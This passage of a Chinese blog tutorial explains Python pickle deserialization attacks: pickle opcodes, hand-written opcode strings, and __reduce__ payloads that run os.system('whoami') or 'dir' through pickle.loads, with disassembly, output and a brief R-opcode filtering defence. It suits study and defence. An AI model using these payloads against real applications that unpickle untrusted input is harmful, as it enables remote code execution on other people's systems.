2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;手写opcode&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手写opcode&#34;&gt;#&lt;/a&gt; 手写 opcode&lt;/h3&gt;
&lt;p&gt;假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用 &lt;code&gt;eval&lt;/code&gt; ，那么利用 &lt;code&gt;__reduce__&lt;/code&gt; 就不能使用了。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;builtins.getattr(builtins, &amp;#x27;eval&amp;#x27;),(&amp;#x27;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;whoami&amp;quot;)&amp;#x27;,)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是在 &lt;code&gt;__reduce__&lt;/code&gt; 生成的序列化字符串，只能执行一个函数，而且在对 open 传参的过程中，程序会报错。&lt;/p&gt;
&lt;p&gt;不能正常生成序列化字符串，这就需要手写一个序列化字符串。&lt;/p&gt;
&lt;p&gt;一些常见的 code&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt; ：以 c 开始的后面两行的作用类似 &lt;code&gt;os.system&lt;/code&gt;  的调用，其中 &lt;code&gt;cos&lt;/code&gt;  在第一行， &lt;code&gt;system&lt;/code&gt;  在第二行。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(&lt;/code&gt; ：相当于左括号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;t&lt;/code&gt; ：相当于右括号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S&lt;/code&gt; ：表示本行的内容一个字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;R&lt;/code&gt; ：执行紧靠自己左边的一个括号对（即 &lt;code&gt;(&lt;/code&gt;  和 &lt;code&gt;t&lt;/code&gt;  之间）的内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt; ：代表该 pickle 结束&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Student():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.name = &amp;#x27;secret.name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.grade = &amp;#x27;secret.grade&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #     return (os.system,(&amp;#x27;dir&amp;#x27;,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = pickle.dumps(Student(),protocol=0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;--------------&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = pickletools.optimize(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;--------------&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;--------------&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nStudent\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVsecret.name\np7\nsVgrade\np8\nVsecret.grade\np9\nsb.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;ccopy_reg\n_reconstructor\n(c__main__\nStudent\nc__builtin__\nobject\nNtR(dVname\nVsecret.name\nsVgrade\nVsecret.grade\nsb.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: c    GLOBAL     &amp;#x27;copy_reg _reconstructor&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   25: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   26: c        GLOBAL     &amp;#x27;__main__ Student&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   44: c        GLOBAL     &amp;#x27;__builtin__ object&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   64: N        NONE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   65: t        TUPLE      (MARK at 25)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   66: R    REDUCE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   67: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   68: d        DICT       (MARK at 67)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   69: V    UNICODE    &amp;#x27;name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   75: V    UNICODE    &amp;#x27;secret.name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   88: s    SETITEM&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   89: V    UNICODE    &amp;#x27;grade&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   96: V    UNICODE    &amp;#x27;secret.grade&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  110: s    SETITEM&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  111: b    BUILD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  112: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再举个例子&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class exp(object):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return (os.system,(&amp;#x27;whoami&amp;#x27;,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;e = exp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = pickle.dumps(e,protocol=0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(s)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: c    GLOBAL     &amp;#x27;nt system&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   11: p    PUT        0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   14: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   15: V        UNICODE    &amp;#x27;whoami&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   23: p        PUT        1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   26: t        TUPLE      (MARK at 14)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   27: p    PUT        2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   30: R    REDUCE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   31: p    PUT        3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   34: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;翻译的每个具体命令上面都有写&lt;/p&gt;
&lt;p&gt;因为 0 版本更容易构造，手写用 0 版本手写&lt;/p&gt;
&lt;p&gt;接下来的手搓 opcode 就有些离谱了，看这篇吧&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYvIyVFNiU4OSU4QiVFNSU4NiU5OW9wY29kZQ==&#34;&gt;python 反序列化～Misaki’s Blog (misakikata.github.io)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;__reduce__r指令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__reduce__r指令&#34;&gt;#&lt;/a&gt; __reduce__(R 指令)&lt;/h3&gt;
&lt;p&gt;ctf 中大多数常见的 pickle 反序列化，利用方法大都是 &lt;code&gt;__reduce__&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;触发 &lt;code&gt;__reduce__&lt;/code&gt; 的指令码为 &lt;code&gt;R&lt;/code&gt; ，干了这么一件事情：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;取当前栈的栈顶记为 &lt;code&gt;args&lt;/code&gt; ，然后把它弹掉。&lt;/p&gt;
&lt;p&gt;取当前栈的栈顶记为 &lt;code&gt;f&lt;/code&gt; ，然后把它弹掉。&lt;/p&gt;
&lt;p&gt;以 &lt;code&gt;args&lt;/code&gt;  为参数，执行函数 &lt;code&gt;f&lt;/code&gt; ，把结果压进当前栈。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;class 的 &lt;code&gt;__reduce__&lt;/code&gt; 方法，在 pickle 反序列化的时候会被执行。其底层的编码方法，就是利用了 &lt;code&gt;R&lt;/code&gt;  指令码。  &lt;code&gt;f&lt;/code&gt;  要么返回字符串，要么返回一个 tuple，后者对我们而言更有用。&lt;/p&gt;
&lt;p&gt;一种很流行的攻击思路是：利用  &lt;code&gt;__reduce__&lt;/code&gt;  构造恶意字符串，当这个字符串被反序列化的时候， &lt;code&gt;__reduce__&lt;/code&gt; 会被执行。&lt;/p&gt;
&lt;p&gt;正常的字符串反序列化后，得到一个 &lt;code&gt;Student&lt;/code&gt;  对象。我们想构造一个字符串，它在反序列化的时候，执行 &lt;code&gt;dir&lt;/code&gt;  指令。那么我们只需要这样得到 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Student():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.name = &amp;#x27;sb&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.grade = &amp;#x27;zz&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return (os.system,(&amp;#x27;dir&amp;#x27;,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = pickle.dumps(Student())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = pickletools.optimize(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(payload)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03cnt\nsystem\nX\x03\x00\x00\x00dir\x85R.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: \x80 PROTO      3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    2: c    GLOBAL     &amp;#x27;nt system&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   13: X    BINUNICODE &amp;#x27;dir&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   21: \x85 TUPLE1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   22: R    REDUCE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   23: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在把 payload 拿给正常的程序（Student 类里面没有 &lt;code&gt;__reduce__&lt;/code&gt; 方法）去解析：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Student():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.name = &amp;#x27;sb&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.grade = &amp;#x27;zz&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;res = pickle.loads(b&amp;#x27;\x80\x03cnt\nsystem\nX\x03\x00\x00\x00dir\x85R.&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;即使 Student 类是正常的，pickle.loads 仍然执行了 os.system (‘dir’)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\Users\18310\AppData\Local\Programs\Python\Python37\python.exe C:/Users/18310/Desktop/serial.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ������ C �еľ��� Windows-SSD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ������к��� 4FEC-7D0B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; C:\Users\18310\Desktop\sec֪ʶ��\Ӧ����Ӧ\py_pickel ��Ŀ¼&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2022/11/24  11:45    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2022/11/24  11:45    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2022/11/24  11:44    &amp;lt;DIR&amp;gt;          .idea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2021/10/07  14:22            16,958 6.png&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2022/08/17  21:43             2,938 aaaa.gif&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2022/08/17  21:53    &amp;lt;DIR&amp;gt;          build&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;只要在序列化中的字符串中存在 &lt;code&gt;R&lt;/code&gt;  指令， &lt;code&gt;__reduce__&lt;/code&gt; 方法就会被执行，无论正常程序中是否写明了 &lt;code&gt;__reduce__&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于 &lt;code&gt;__reduce__&lt;/code&gt; 方法对应的操作码是 &lt;code&gt;R&lt;/code&gt; ，只需要&lt;strong&gt;把操作码 &lt;code&gt;R&lt;/code&gt;  过滤掉&lt;/strong&gt;就行了。这个可以很方便地利用 &lt;code&gt;pickletools.genops&lt;/code&gt;  来实现。&lt;/p&gt;
